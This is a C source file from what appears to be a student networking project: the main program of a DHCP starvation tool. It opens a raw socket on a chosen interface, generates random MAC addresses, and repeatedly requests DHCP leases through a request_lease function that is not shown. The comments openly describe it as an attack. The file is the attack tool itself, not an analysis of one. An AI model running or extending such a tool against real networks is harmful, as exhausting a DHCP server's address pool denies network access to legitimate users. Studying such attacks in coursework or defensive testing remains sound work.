/**
 * IPK 2. project
 * @date 28.03.2018
 * @author Alena Tesarova
 *
 */
#include <stdio.h>
#include <getopt.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <assert.h>
#include <signal.h>

#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>

#include "dhcp.h"

// interface macaddress
unsigned char ifmac[6];
//client random macaddress
unsigned char mac[MAC_ADDRESS_L];
// destination mac address for discover
unsigned char destmac[] = {0xff, 0xff, 0xff, 0xff,0xff, 0xff};

// crete sockets to send data
int socket_send = -1;

/**
* close_socket
* function closes socket
* @param socket
*/

int close_socket()
{
    //close(socket_send );
    return EXIT_SUCCESS;
}

void signal_handler(int signum)
{
    close_socket();
    exit(signum);
}


/**
* generate_mac_addr
* Function generates random mac address
*/
void  generate_mac_addr()
{
    for( int i = 0; i < MAC_ADDRESS_L; i ++)
    {
        // number cant be above 15 in hexadecimal, 255 in descimal
        unsigned int rand_number = rand() % 255 + 1;
        mac[i] = rand_number;
    }

}

int main ( int argc, char *argv[] )
{
    // inicialized random generator
    srand( time(NULL) );
    signal(SIGINT, signal_handler);

    // enter: ./ipk-dhcpstarve -i interface
    // interface: name of interface to generate attack
    if ( argc != 3 )
    {
        fprintf(stderr, "Bad number of arguments");
        return(EXIT_FAILURE);
    }
    if ( strcmp( argv[ 1 ], "-i" ) != 0 )
    {
        fprintf(stderr, "Bad number of arguments");
        return(EXIT_FAILURE);
    }
    char interfacename[50];
    strncpy( interfacename, argv[2], sizeof( interfacename ) );

    // set options to receive socket
    int sockopt = 1;
    /* SENDING SOCKET */
    // raw netword protocol access
    if ( ( socket_send  = socket( PF_PACKET, SOCK_RAW, htons( ETH_P_ALL ) ) ) == -1 )
    {
        perror ( "Can not create send socket\n" );
        return( EXIT_FAILURE );
    }
    // options for send socket
    if ( ( setsockopt( socket_send, SOL_SOCKET, SO_BROADCAST, &sockopt, sizeof( sockopt )  ) ) != 0 )
    {
        perror(  "Can not not set any options to socket\n");
        return(EXIT_FAILURE);
    }

    // get network interface index which name is in interfacename
    // socket must contain packet socket descriptor

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy( ifr.ifr_name, interfacename, sizeof( ifr.ifr_name ) );

    // we need destination mac address
    if ( ioctl( socket_send, SIOCGIFHWADDR, &ifr ) == -1 )
    {
        fprintf(stderr, "ioctl error\n");
        return( EXIT_FAILURE );
    }
    memcpy( ifmac, ifr.ifr_hwaddr.sa_data, ETH_ALEN );

    if ( ioctl( socket_send, SIOCGIFINDEX, &ifr ) == -1 )
    {
        fprintf( stderr, "ioctl error\n" );
        return( EXIT_FAILURE );
    }

    int interface_index = ifr.ifr_ifindex;

    int poc = 5;
    while(poc)
    {
        poc--;
        // generate mac address
        generate_mac_addr();
        // request lease
        request_lease(socket_send, mac, interface_index );
    }
    close_socket();
    return 0;

}
